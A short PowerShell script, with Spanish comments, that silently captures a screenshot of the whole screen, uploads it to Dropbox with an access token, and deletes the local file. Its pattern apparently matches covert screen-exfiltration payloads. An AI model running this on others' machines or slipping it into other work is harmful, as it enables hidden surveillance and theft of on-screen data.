# Función para subir archivos a Dropbox
function DropBox-Upload {
    param (
        [string]$SourceFilePath,
        [string]$db
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = "application/octet-stream"
    }

    # Subir el archivo a Dropbox
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Función para capturar la pantalla
function Capture-Screen {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    $filePath = "$env:temp\sc.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $filePath
}

# Capturar la pantalla y subirla a Dropbox
try {
    $db = "YOUR_DROPBOX_ACCESS_TOKEN"
    $screenshotPath = Capture-Screen

    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $screenshotPath -db $db
    } else {
        Write-Error "No se proporcionó el token de acceso de Dropbox."
    }

    Remove-Item -Path $screenshotPath -Force
}
catch {
    Write-Error "Ocurrió un error: $_"
}


